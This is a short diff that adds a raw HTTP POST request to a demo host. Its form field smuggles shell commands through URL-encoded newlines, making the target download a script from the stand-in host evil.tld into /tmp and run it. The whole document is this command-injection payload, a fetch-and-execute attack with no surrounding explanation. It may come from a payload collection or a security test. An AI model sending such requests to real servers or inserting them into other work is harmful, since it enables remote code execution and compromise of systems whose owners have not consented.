@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+Connection: close
+
+data=;%0awget%0ahttp://evil.tld/s.sh%0a-O%0a/tmp/s.sh;%0ash%0a/tmp/s.sh
